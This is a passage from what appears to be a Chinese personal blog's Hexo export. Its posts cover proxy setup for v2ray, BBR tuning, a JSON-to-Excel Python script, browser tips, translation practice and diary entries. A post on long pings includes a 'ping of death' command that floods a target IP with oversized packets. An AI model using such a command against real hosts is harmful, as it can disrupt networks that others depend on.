<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>代码：<code>document.getElementsByTagName(&quot;video&quot;) [0].playbackRate = [自定义播放速度]</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gczlxes9mqj31f60qg4bm.jpg" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://prozhuchen.github.io/2017/01/10/slowdownyoutube/">参考文章</a></p>
]]></content>
      <categories>
        <category>浏览器</category>
      </categories>
      <tags>
        <tag>F12控制台</tag>
        <tag>YTB视频播放速度调整</tag>
      </tags>
  </entry>
  <entry>
    <title>科学上网-PC端浏览器直连国内网站、代理国外网站</title>
    <url>//posts/ZH-CN/SwitchyOmega_PC.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在自己搭的v2ray能代理国外网站了，但是一股脑代理了所有网站，国内网站从国外绕一圈，影响访问体验。我们要精益求精，精准代理。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="要是可以自动切换代理就好了"><a href="#要是可以自动切换代理就好了" class="headerlink" title="要是可以自动切换代理就好了"></a>要是可以自动切换代理就好了</h2><p>现状：PC端访问国内网站的速度受到代理影响，不够fast。我们使用的是SwitchyOmega这款浏览器插件控制代理。<br>需求：国内网站直连、只代理国外网站。<br>解决方案有二：<br>一、访问国内网站时，手动选择直接代理；访问国外网站时，再手动切回自定义的代理配置。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd081065hej31f60u0gpv.jpg" alt="image.png"><br><strong>缺点：手动切换，操作繁琐，浪费宝贵时间。</strong></p>
<p>二、根据我访问的网站，自行切换到<code>直连模式</code>或者<code>代理模式</code>。<br><strong>优点：智能化切换上网方式，听起来就很酷嘛~</strong></p>
<p>显然，方案二中标。</p>
<h2 id="怎么设置SwitchyOmega"><a href="#怎么设置SwitchyOmega" class="headerlink" title="怎么设置SwitchyOmega"></a>怎么设置SwitchyOmega</h2><p><a href="https://eddyemma.com/blog/2018/03/13/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%8C%87%E5%8D%97%EF%BC%887%EF%BC%89-switchyomega/">参考这篇文章的方法</a><br>刚接触SwitchyOmega这款插件，安装的时候就发现有个自动切换功能，当时就想肯定可以用它实现自动切换代理，果然，网上有这样的应用参考。<br>原理就是：设置一个应用场景（用途是做代理），代理所有网站。再设置一个应用场景（用途是设置自动切换代理的规则），规则设置为：代理国外网站（网上有人整理了被404的国外网站列表），其余网站默认直连。</p>
<h3 id="应用场景1：代理所有网站"><a href="#应用场景1：代理所有网站" class="headerlink" title="应用场景1：代理所有网站"></a>应用场景1：代理所有网站</h3><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd08ai8i8uj317n0jy75g.jpg" alt="image.png"></p>
<h3 id="应用场景2：设置自动代理规则"><a href="#应用场景2：设置自动代理规则" class="headerlink" title="应用场景2：设置自动代理规则"></a>应用场景2：设置自动代理规则</h3><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd08dgpwh6j31f60qfjua.jpg" alt="image.png"><br>GFW列表可以一键更新（因为作者在维护这个GFW列表，他那边一更新，SwitchyOmega就根据这个网址重新下载文件，导入配置），非常好用。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd0cjcr89tj31f60qen05.jpg" alt="image.png"></p>
<h2 id="测试一下"><a href="#测试一下" class="headerlink" title="测试一下"></a>测试一下</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd08eug2imj31f60u0q77.jpg" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://eddyemma.com/blog/2018/03/13/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%8C%87%E5%8D%97%EF%BC%887%EF%BC%89-switchyomega/">参考文章</a></p>
]]></content>
      <categories>
        <category>v2ray</category>
      </categories>
      <tags>
        <tag>科学上网</tag>
        <tag>自动切换代理</tag>
        <tag>SwitchyOmega插件</tag>
      </tags>
  </entry>
  <entry>
    <title>笑死人不偿命的翻译</title>
    <url>//posts/ZH-CN/Funny_Translation.html</url>
    <content><![CDATA[<p>这翻译是想把我笑死吗？！</p>
<p><escape> <span id="more"></span></escape></p>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gazum6t70oj30pj036adh.jpg" alt="image.png"></p>
<p>纯天然、植物饲养。这么高级的词汇怎么想到的呀:》</p>
]]></content>
      <categories>
        <category>笑一笑</category>
      </categories>
      <tags>
        <tag>乐子</tag>
      </tags>
  </entry>
  <entry>
    <title>笨蛋爆炸</title>
    <url>//posts/ZH-CN/Wiki_Idiot_Boom.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>什么是笨蛋爆炸？</p>
<p><escape> <span id="more"></span></escape></p>
<p>意思就是：物以类聚，人以群分。</p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://www.jianshu.com/p/6b971fa496b6">https://www.jianshu.com/p/6b971fa496b6</a></p>
]]></content>
      <categories>
        <category>wiki</category>
      </categories>
      <tags>
        <tag>wiki</tag>
        <tag>笨蛋爆炸</tag>
      </tags>
  </entry>
  <entry>
    <title>精准科学上网-安卓手机设置BfrostV软件精准代理</title>
    <url>//posts/ZH-CN/BfrostV.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刚才我们用SwitchyOmega这款插件，实现了PC端的精准代理。安卓手机怎么实现精准代理？我们的安卓手机是用的BfrostV软件爬梯子，这款软件也有许多自定义设置可以满足我们精准代理的需要。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="BfrostV设置"><a href="#BfrostV设置" class="headerlink" title="BfrostV设置"></a>BfrostV设置</h2><p>之前我们是直接把PC端的配置文件导入了手机端的BfrostV软件中，由于我的配置文件定义了路由，就没有办法使用BfrostV自带的自定义路由。配置文件将许多设置写死了，就失去了定制化的灵活性。于是手动设置配置文件，手动设置绕过国内的App应用。<br>之后再自定义路由设置，添加软件内置的规则表。</p>
<h3 id="手动设置配置文件"><a href="#手动设置配置文件" class="headerlink" title="手动设置配置文件"></a>手动设置配置文件</h3><p>开启<code>mux并发</code>、设置<code>自定义路由</code>和<code>分应用模式</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd0bq1ha8uj30ho0pkdhp.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd0botyj0zj30ot0pywhl.jpg" alt="image.png"><br><strong>注意：分应用模式勾选了绕过vpn的应用之后，要点击右上角的点点，点击应用到所有配置文件</strong><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd0fs6ebt4j30cb0qotfc.jpg" alt="image.png"></p>
<h3 id="自定义路由设置"><a href="#自定义路由设置" class="headerlink" title="自定义路由设置"></a>自定义路由设置</h3><p>这两个规则都添加上。【绕过局域网地址规则】和【GFW列表规则】<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd0btdtv8ej30u01t0tev.jpg" alt="image.png"><br>路由自定义非常具有灵活性，我们可以根据需要，添加GFW规则（添加相应的规则，就表示代理这个域名的访问）：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd0bw90h9fj30u01t0k2m.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>设置完成后，我们连接代理，就能实现精准代理，国内App和网站的流量就不会经过代理，精准代理的同时，也节省了代理流量，高效利用带宽资源，一定程度上可以提升冲浪体验。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://ssr.tools/342">参考文章</a></p>
]]></content>
      <categories>
        <category>v2ray</category>
      </categories>
      <tags>
        <tag>科学上网</tag>
        <tag>安卓手机BfrostV</tag>
        <tag>精准代理</tag>
      </tags>
  </entry>
  <entry>
    <title>范晓萱-自言自语</title>
    <url>//posts/ZH-CN/music-selftalk-mavis-fan.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近才认识范晓萱。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="自言自语"><a href="#自言自语" class="headerlink" title="自言自语"></a>自言自语</h2><center>
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="750" height="110" loading="lazy" sandbox="allow-popups allow-scripts allow-same-origin" src="https://www.xiami.com/webapp/embed-player?autoPlay=1&id=102818"></iframe>
</center>

<blockquote>
<p>天是灰色的</p>
</blockquote>
<p>雨是透明的</p>
<p>心是灰色的</p>
<p>我是透明的</p>
<p>爱是盲目的</p>
<p>恋是疯狂的</p>
<p>痴是可悲的</p>
<p>我是绝对的</p>
<p>你是自由的</p>
<p>我是附属的</p>
<p>她是永远的</p>
<p>我是错误的</p>
<p>梦是美好的</p>
<p>你是残酷的</p>
<p>我是灰色的</p>
<p>我是透明的</p>
<p>你是自由的</p>
<p>我是附属的</p>
<p>她是永远的</p>
<p>我是错误的</p>
<p>梦是美好的</p>
<p>你是残酷的</p>
<p>我是灰色的</p>
<p>我是透明的</p>
<p>梦是美好的</p>
<p>你是残酷的</p>
<p>我是灰色的</p>
<p>我是透明的</p>
<p>天是灰色的</p>
<p>雨是透明的</p>
<p>心是灰色的</p>
<p>我是透明的</p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
      <tags>
        <tag>自言自语</tag>
        <tag>范晓萱</tag>
      </tags>
  </entry>
  <entry>
    <title>读取json数据并写入excel</title>
    <url>//posts/ZH-CN/json-convert-excel-python.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>工作中整理数据需要把json文件转为excel数据。用python来做。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建excel工作表</span></span><br><span class="line">workbook = xlwt.Workbook(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">worksheet = workbook.add_sheet(<span class="string">&#x27;sheet1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置表头</span></span><br><span class="line">worksheet.write(<span class="number">0</span>, <span class="number">0</span>, label=<span class="string">&#x27;备注&#x27;</span>)</span><br><span class="line">worksheet.write(<span class="number">0</span>, <span class="number">1</span>, label=<span class="string">&#x27;App包名&#x27;</span>)</span><br><span class="line">worksheet.write(<span class="number">0</span>, <span class="number">2</span>, label=<span class="string">&#x27;App签名&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取json文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;b.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = json.load(f)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将json字典写入excel</span></span><br><span class="line"><span class="comment"># 变量用来循环时控制写入单元格，感觉有更好的表达方式</span></span><br><span class="line">val = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> list_item <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">for</span> key, value <span class="keyword">in</span> list_item.items():</span><br><span class="line">        <span class="keyword">if</span> key == <span class="string">&quot;description&quot;</span>:</span><br><span class="line">            worksheet.write(val, <span class="number">0</span>, value)</span><br><span class="line">        <span class="keyword">elif</span> key == <span class="string">&quot;app_pkgname&quot;</span>:</span><br><span class="line">            worksheet.write(val, <span class="number">1</span>, value)</span><br><span class="line">        <span class="keyword">elif</span> key == <span class="string">&quot;app_cer&quot;</span>:</span><br><span class="line">            worksheet.write(val, <span class="number">2</span>, value)</span><br><span class="line">    val = val + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存</span></span><br><span class="line">workbook.save(<span class="string">&#x27;b-App.xls&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>json文件格式：<br><a href="https://v2ray.dana5haw.com:8008/image/ZaJu"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/14/image570b0a9c6b7fbd99.png" alt="image570b0a9c6b7fbd99.png"></a><br>转换为excel之后：<br><a href="https://v2ray.dana5haw.com:8008/image/Znuc"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/14/image81096c3f92e00df9.png" alt="image81096c3f92e00df9.png"></a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>基本上是抄了这个文章的<a href="https://blog.csdn.net/destinymf/article/details/78096678">代码</a></p>
]]></content>
      <categories>
        <category>实用python脚本</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>json写入excel</tag>
      </tags>
  </entry>
  <entry>
    <title>让v2ray更快-加载ubuntu内置的BBR加速模块</title>
    <url>//posts/ZH-CN/V2ray_BBR.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>让v2ray更快一点~<br>我们可以使用谷歌BBR加速算法，而ubuntu18.04这个版本内置了BBR模块，我们直接加载就行了。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>操作过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#加载BBR算法</span><br><span class="line">/sbin/modprobe tcp_bbr</span><br><span class="line">#编辑系统配置文件</span><br><span class="line">sudo vi /etc/sysctl.conf</span><br><span class="line">#结尾添加两行</span><br><span class="line">net.core.default_qdisc=fq</span><br><span class="line">net.ipv4.tcp_congestion_control=bbr</span><br><span class="line">#使修改生效</span><br><span class="line">sysctl -p</span><br><span class="line">#查看已加载算法模块</span><br><span class="line">sysctl net.ipv4.tcp_available_congestion_control</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcxc7ftizpj30ob0fn3zs.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcxc5tu82zj30ou0fo75n.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcxc6msc0lj30ox0fnwfq.jpg" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://since1989.org/vultr/vps-v2ray-bbr-ss-serverspeeder.html">https://since1989.org/vultr/vps-v2ray-bbr-ss-serverspeeder.html</a></p>
]]></content>
      <categories>
        <category>v2ray</category>
      </categories>
      <tags>
        <tag>v2ray</tag>
        <tag>ubuntu内置BBR加速模块</tag>
      </tags>
  </entry>
  <entry>
    <title>谷歌浏览器安装crx扩展程序失败，怎么解决</title>
    <url>//posts/ZH-CN/google-chrome-crx-failed-zip.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>新电脑用不了谷歌浏览器，我想的是，先把omega-proxy这个扩展程序装上，就可以代理上网，登录谷歌账号并开启冲浪之旅。但是把crx扩展程序拖到扩展程序安装，居然安装失败。怎么办？</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>在网上查到，有这样的解决方法：把crx文件重命名为zip或者rar，拖到扩展程序里面，自动解压，就可以安装成功。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/27/image.png" alt="image.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考了<a href="https://blog.csdn.net/wst0717/article/details/88867047">这篇文章</a></p>
]]></content>
      <categories>
        <category>问题解决</category>
        <category>谷歌浏览器</category>
      </categories>
      <tags>
        <tag>谷歌浏览器</tag>
        <tag>扩展程序安装失败</tag>
      </tags>
  </entry>
  <entry>
    <title>超棒的输出者-小白领路人</title>
    <url>//posts/ZH-CN/GreenHand.html</url>
    <content><![CDATA[<h2 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h2><p>互联网拉进了人们的距离，在互联网中成长的一代，是幸运的一代。感谢互联网，感谢乐于分享知识经验的前辈。<br>才发现一座宝藏，叫做廖雪峰的博客。非常适合快速入门编程。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="最新教程"><a href="#最新教程" class="headerlink" title="最新教程"></a>最新教程</h2><p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gb0p3hv706j31f60u0qfh.jpg" alt="教程.png"><br>这些都得学。</p>
]]></content>
      <categories>
        <category>小白变小黑</category>
      </categories>
      <tags>
        <tag>学习的榜样</tag>
      </tags>
  </entry>
  <entry>
    <title>辉瑞赚翻了</title>
    <url>//posts/ZH-CN/Espresso-Economics-Marathon-96day.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>经济学人浓咖啡马拉松计划doing！第-96天。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="喝吧"><a href="#喝吧" class="headerlink" title="喝吧"></a>喝吧</h2><p>Profit booster: Pfizer<br>盆满钵满：辉瑞</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/02/pfizer.png" alt="pfizer.png"> </p>
<p>Pfizer has had a good year.<br>今年对辉瑞来说是个井喷年。</p>
<p>The wide adoption of the drugmaker’s covid-19 jab, the first to be rolled out, has given its profits a real shot in the arm.<br>辉瑞作为第一个推出新冠疫苗的药厂，疫苗的广泛接种让它赚的盆满钵满。</p>
<p>It is on track to produce 3bn doses this year.<br>今年有望生产出30亿剂疫苗。</p>
<p>America’s drug regulator has just approved its vaccine for children aged 5-11.<br>美国药监局刚刚批准了辉瑞生产的适用于5至11岁儿童的疫苗。</p>
<p>Next year it expects to almost double covid-vaccine sales.<br>辉瑞希望明年的新冠疫苗销量达到今年的两倍。</p>
<p>As it reports quarterly results on Tuesday, its upward trajectory shows no signs of slowing.<br>周二发布的季度报告显示，其销量上升趋势并未见减缓迹象。</p>
<p>Pfizer’s non-covid business is also flourishing, with strong year-on-year growth in the second quarter.<br>在第二季度报告中显示，辉瑞的非新冠疫苗业务也如火如荼，正以逐年递增的趋势发展。</p>
<p>That trend is likely to continue, as the mRNA technology its covid vaccine employs finds other uses.<br>因为mRNA技术不仅能用于新冠疫苗的研发，非新冠疫苗的业务趋势可能仍会持续上升。</p>
<p>The recent acquisition of a cancer-drug biotech company for $2.3bn shows Pfizer is looking beyond the pandemic.<br>最近，辉瑞以23亿美元收购了一家癌症药物生物科技公司（Trillium Therapeutics）。这也说明辉瑞看到了疫情之外的业务机会。</p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/02/virus.jpg" alt="virus.jpg"><br><img src="https://v2ray.dana5haw.com:8008/images/2021/11/02/trillium.png" alt="trillium.png"></p>
<p>In August the firm raised its 2021 revenue projections.<br>8月，辉瑞公布了2021年度预期收入。</p>
<p>Thanks to demand for covid-vaccine boosters and the possibility that new variants of the virus will emerge, it may set its sights even higher.<br>由于新冠疫苗的大量需求，加上新冠病毒新毒株也可能面世，辉瑞的预期收入可能更高。</p>
<p><br>很多国家推出了疫苗护照，接种了新冠疫苗的旅客才可以入境。</br></p>
<p><img src="https://v2ray.dana5haw.com:8008/images/2021/11/02/vaccine-paasport.jpg" alt="vaccine-paasport.jpg"></p>
]]></content>
      <categories>
        <category>经济学人</category>
      </categories>
      <tags>
        <tag>I期马拉松</tag>
        <tag>经济学人</tag>
        <tag>浓咖啡</tag>
      </tags>
  </entry>
  <entry>
    <title>跳出舒适地带，听听别人的故事</title>
    <url>//posts/ZH-CN/jump-out-of-comfortzone-listen-to-others&#39;-stories.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天见了一个人，感想很多。<br><escape> <span id="more"></span></escape></p>
<h2 id="想到啥说啥"><a href="#想到啥说啥" class="headerlink" title="想到啥说啥"></a>想到啥说啥</h2><p>第一印象，像姜思达。比较自然，很懂人际交往。很注重个人形象，聊天时候不会时不时看手机。是个优秀的人吧。至少是我现在尚难企及的。<br>看起来是随便聊聊，不会给人很刻意的感觉，就是趁人放下戒备的时候，试图获取自己想得到的信息。<br>我于他而言究竟有何价值？似乎没有，又似乎有一点点。我是该为自己的那一点点可能存在的价值感到窃喜呢，还是该为此感到失望？<br>是不是人长大之后，就会凡是格外小心，生活好像如履薄冰，一句话，一个举动，可能都会不小心犯错。<br>不知道是不是因为太过袒露自我，已经有好些人给我说过这样的话：“我好像说得太多了，本来不该给你讲这些的”。我并没有因为别人愿意给我讲一些隐私而感到窃喜，反而会感到一些些压力，因为心里装的东西很多，出于道德，不能将别人的隐私泄露出去。<br>人与人之间的关系真的妙不可言。不知道是不是自己过于自信，好像总能感受到他人的感受。有时我觉得自己是一个容器，可以装下世间所有的情绪，感受周围的一切情绪，所以就相对受环境影响多一些。<br>又被问到个人规划问题。有时候觉得目标很清晰，有时候又觉得这些目标都不是自己真正想要的。<br>为什么人要工作呢，世界设定的这个秩序，就是为了让人少去胡思乱想吧，好好玩一场游戏就好了。<br>我也不确定现在是否正在经历hard模式，但是基于爱挑战的个性，如果真的一帆风顺，游戏还会有那么好玩吗？<br>之前我想过，如果自己没有遇到某某某会怎样，如果自己去了另一个地方会怎样，如果自己生在另一个家庭会怎样。这些都不用假设，这些假设已经有其他人正在体验，而我正在体验的，也许正是有些人幻想过的生活。所以，珍惜手中拿到的剧本。角色可能不太好演，还是尽力表演吧。<br>尽力去发现每一天的独特。<br>昨天晚上梦到地震了，震感非常真实。看到大家不慌不忙的样子，心里很焦灼。还好没有造成灾难。<br>很久没有写博客，也很久没有记录自己。<br>佛说，前世五百次回眸才换来今生相见。珍惜现在遇到的每一个人，珍惜每一次经历。<br>最近末日感是很浓烈，如果把每天都当作末日，也许我们的体验感会很不一样。原本纠结的那些东西、那些想不明白的东西，好像突然就清晰了。<br>努力体验这一段不知长短的人生。</p>
]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>舒适地带</tag>
      </tags>
  </entry>
  <entry>
    <title>输入法之怎么输入特殊符号</title>
    <url>//posts/ZH-CN/How_To_Type.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>想要输入一些特殊符号，比如这种<code>「</code>、<code>」</code>。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><h3 id="方法一：从网上复制粘贴"><a href="#方法一：从网上复制粘贴" class="headerlink" title="方法一：从网上复制粘贴"></a>方法一：从网上复制粘贴</h3><p><a href="https://www.fuhaoku.net/">比如这个网站</a>就有许多符号，我们可以直接复制粘贴搬来用。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbgqmdjg1hj31ei0qfn2p.jpg" alt="image.png"></p>
<h3 id="方法二：输入法里面找"><a href="#方法二：输入法里面找" class="headerlink" title="方法二：输入法里面找"></a>方法二：输入法里面找</h3><p>在输入法中按v1（快捷键：<code>ctrl+shift+B</code>），就能找到许多特殊符号。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbgqny74v1j30i704o0sq.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbgqpea7bdj30lq0ah74o.jpg" alt="image.png"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>以后就可以写各种花里胡哨的符号啦<del>~</del></p>
]]></content>
      <categories>
        <category>怎么码字</category>
      </categories>
      <tags>
        <tag>输入法</tag>
        <tag>输入特殊符号</tag>
      </tags>
  </entry>
  <entry>
    <title>部署hexo博客报错，账号密码错误，怎么办</title>
    <url>//posts/ZH-CN/hexo-deploy-failed-access-token.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>部署hexo博客时，输入了错误的账号名，怎么更正这个账号名？google了一下，需要更改windows凭据。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">remote: Incorrect username or password ( access token )</span><br></pre></td></tr></table></figure>

<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>更改windows凭据。</p>
<ol>
<li>windows键+i，进入windows设置界面，搜索“windows凭据”，进入设置页面。<br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/21/image91ed43d33ba27aad.png" alt="image91ed43d33ba27aad.png"></li>
<li>点击“编辑”，修改账号名。（这儿只是举例，实际需要修改github对应的凭据）<br><img src="https://v2ray.dana5haw.com:8008/images/2020/06/21/imagee431cb9f98276c97.png" alt="imagee431cb9f98276c97.png"></li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>参考<a href="https://blog.csdn.net/mmyhs/article/details/81589419">这篇文章</a></p>
]]></content>
      <categories>
        <category>hexo博客</category>
      </categories>
      <tags>
        <tag>hexo博客</tag>
        <tag>账号或密码错误</tag>
        <tag>windows凭据</tag>
      </tags>
  </entry>
  <entry>
    <title>这个充满人间大爱的世界容不下小爱</title>
    <url>//posts/ZH-CN/Liar.html</url>
    <content><![CDATA[<h2 id="20天的双胞胎会说话"><a href="#20天的双胞胎会说话" class="headerlink" title="20天的双胞胎会说话"></a>20天的双胞胎会说话</h2><p>21世纪充满奇迹，人类已经进化到不足月就能讲话的程度。我们宣扬伟大，我们不愿渺小，真好。</p>
<p><escape> <span id="more"></span></escape></p>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0q3xtzaaj30hj0n5tni.jpg" alt="image.png"></p>
<h2 id="蓝鸟变金鸟"><a href="#蓝鸟变金鸟" class="headerlink" title="蓝鸟变金鸟"></a>蓝鸟变金鸟</h2><p>迅雷的超级会员是金鸟……办了个会员，下载靶机实在太慢了，超级会员帮我节省时间。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0ql8dfybj302r02uq2v.jpg" alt="image.png"></p>
]]></content>
      <categories>
        <category>有点危险</category>
      </categories>
      <tags>
        <tag>伟光正</tag>
      </tags>
  </entry>
  <entry>
    <title>长ping测试网络状态</title>
    <url>//posts/ZH-CN/long-ping.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>工作中，需要测试两台机器之间的网络状态，使用长ping查看一下网络状态。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="windows服务器怎么长ping"><a href="#windows服务器怎么长ping" class="headerlink" title="windows服务器怎么长ping"></a>windows服务器怎么长ping</h2><p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping -t [IP地址]</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/Zwaf"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/14/imagee3dd53d84d22d73e.png" alt="imagee3dd53d84d22d73e.png"></a></p>
<h2 id="linux机器怎么长ping"><a href="#linux机器怎么长ping" class="headerlink" title="linux机器怎么长ping"></a>linux机器怎么长ping</h2><p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping -s 1500 -c 4 [IP地址]</span><br><span class="line">-s 指定数据包大小为1500Byte</span><br><span class="line">-c 指定ping的次数</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/ZAyj"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/14/image1dd4a13afd54e986.png" alt="image1dd4a13afd54e986.png"></a></p>
<h2 id="windows死亡之ping"><a href="#windows死亡之ping" class="headerlink" title="windows死亡之ping"></a>windows死亡之ping</h2><p>命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping -t -l 65500 [IP地址]</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/ZC9Q"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/14/image97e342f531c052fd.png" alt="image97e342f531c052fd.png"></a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>长ping</tag>
        <tag>网络状态</tag>
      </tags>
  </entry>
  <entry>
    <title>问题解决-github头像无法显示且加载速度慢</title>
    <url>//posts/ZH-CN/TroubleShoot_Github_Avatar.html</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>github网站的头像总是无法显示，加载速度也比较慢。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么办"><a href="#怎么办" class="headerlink" title="怎么办"></a>怎么办</h2><p>原来是因为国内的地址解析有问题，访问github的某些域名出错。修改电脑本机的hosts文件，把相关域名的dns解析配置上去即可。</p>
